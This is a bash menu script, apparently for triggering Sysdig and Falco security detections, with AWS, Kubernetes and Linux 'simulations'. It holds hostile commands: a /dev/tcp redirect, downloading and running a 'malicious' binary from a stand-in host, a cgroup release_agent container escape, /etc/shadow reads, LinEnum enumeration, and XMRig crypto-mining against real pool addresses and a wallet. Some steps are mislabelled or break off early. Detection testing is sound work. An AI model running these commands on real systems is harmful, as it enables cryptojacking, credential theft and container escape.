#!/bin/bash

# ASCII Art
echo "   _____                   __ _           ______    __ ______    __ ______"
echo "  / ___/ __  __ _____ ____/ /(_)____ _   / ____/  _/_// ____/  _/_// ____/"
echo "  \\__ \\ / / / // ___// __  // // __ \`/  /___ \\  _/_/ /___ \\  _/_/ /___ \\  "
echo " ___/ // /_/ /(__  )/ /_/ // // /_/ /  ____/ /_/_/  ____/ /_/_/  ____/ /  "
echo "/____/ \\__, //____/ \\__,_//_/ \\__, /  /_____//_/   /_____//_/   /_____/   "
echo "      /____/                 /____/                                       "
echo ""

# Function to display the menu
display_menu() {
    echo "Sysdig Command Line Tool"
    echo "========================="
    echo "1. AWS Simulations"
    echo "2. Kubernetes Simulations"
    echo "3. Linux Simulations"
    echo "4. Run Additional Security Commands"
    echo "5. Falco Simulation Commands"
    echo "6. Cleanup Simulations"
    echo "7. Exit"
    echo ""
}

# AWS Simulations
simulate_aws() {
    echo "Running AWS Simulations..."
    echo "Simulating AWS credential exfiltration..."
    touch ~/.aws/credentials_exfiltrated
    echo "[default]" > ~/.aws/credentials_exfiltrated
    echo "aws_access_key_id = AKIAxxxxxxxxxxxxxxx" >> ~/.aws/credentials_exfiltrated
    echo "aws_secret_access_key = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" >> ~/.aws/credentials_exfiltrated
    echo "AWS credential exfiltration simulation completed."
    echo
}

# Kubernetes Simulations
simulate_kubernetes() {
    echo "Running Kubernetes Simulations..."
    echo "Simulating malicious pod creation..."
    kubectl run malicious-pod --image=alpine --command -- sleep 3600
    echo "Malicious pod 'malicious-pod' created."
    echo
}

# Linux Simulations
simulate_linux() {
    echo "Running Linux Simulations..."
    echo "Simulating file creation and privilege escalation..."
    touch /tmp/linux_simulation_file.txt
    echo "Test data" > /tmp/linux_simulation_file.txt
    chmod 777 /tmp/linux_simulation_file.txt
    echo "Privilege escalation attempt (access /etc/shadow)..."
    cat /etc/shadow >/dev/null 2>&1 || echo "Access denied (expected)."
    echo "Linux simulation completed."
    echo
}

# Falco Simulation Commands
simulate_falco() {
    echo "Running Falco Simulation Commands..."
    
    echo "1. Redirecting STDOUT/STDIN to a network connection..."
    bash -c 'exec 1>/dev/tcp/127.0.0.1/4444; echo "test"'

    echo "2. Injecting a kernel module..."
    sudo insmod /path/to/module.ko

    echo "3. Launching debugfs in a privileged container..."
    # docker run --privileged -it --rm ubuntu:latest debugfs
    kubectl apply -f https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/dodgy-pod.yaml
    kubectl exec -it dodgy-pod -- bash
    sleep 3
    exit

    echo "4. Creating release_agent for container escape simulation..."
    echo "/path/to/exploit" | sudo tee /sys/fs/cgroup/release_agent

    echo "5. Attaching PTRACE to a process..."
    sudo strace -p $(pgrep bash)

    echo "6. Performing PTRACE anti-debug attempt..."
    sudo gdb --pid=$(pgrep bash) -batch -ex "set logging on" -ex "ptrace PTRACE_TRACEME"

    echo "7. Executing script from /dev/shm..."
    echo -e '#!/bin/bash\necho "test"' > /dev/shm/test.sh && chmod +x /dev/shm/test.sh && /dev/shm/test.sh

    echo "8. Dropping and executing a binary in a container..."
    docker run --rm -it ubuntu:latest bash -c "wget http://example.com/malicious; chmod +x malicious; ./malicious"

    echo "9. Attempting SSH connection on a non-standard port..."
    ssh -p 8080 user@host

    echo "10. Fileless execution using memfd_create..."
    python3 -c 'import os; os.system("exec -c echo hello")'

    echo "Falco simulations completed."
    echo
}

# Additional Security Commands
run_additional_commands() {
    echo "Running Additional Security Commands..."
    echo "Executing XMRig with donate-level 8..."
    ./xmrig --donate-level 8 -o 47.115.41.163:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero

    echo "Executing XMRig with alternative pool..."
    ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u lies@lies.lies -p x -t 2

    echo "Searching for AWS secret keys in files..."
    grep "aws_secret_access_key" /path/to/some/file || echo "No AWS secrets found."

    echo "Attempting to read shadow file..."
    sudo cat /etc/shadow > /dev/null

    echo "Running LinEnum script for privilege enumeration..."
    bash -c ./LinEnum.sh
    echo
}

# Cleanup Function
cleanup_simulations() {
    echo "Cleaning up simulations..."
    rm -f ~/.aws/credentials_exfiltrated
    kubectl delete pod malicious-pod --ignore-not-found >/dev/null 2>&1
    rm -f /tmp/linux_simulation_file.txt
    echo "All simulations cleaned up."
    echo
}

# Main Program
while true; do
    display_menu
    read -rp "Select an option [1-7]: " choice
    case $choice in
        1) simulate_aws ;;
        2) simulate_kubernetes ;;
        3) simulate_linux ;;
        4) run_additional_commands ;;
        5) simulate_falco ;;
        6) cleanup_simulations ;;
        7) echo "Exiting. Stay secure!"; exit 0 ;;
        *) echo "Invalid option. Please try again." ;;
    esac
done
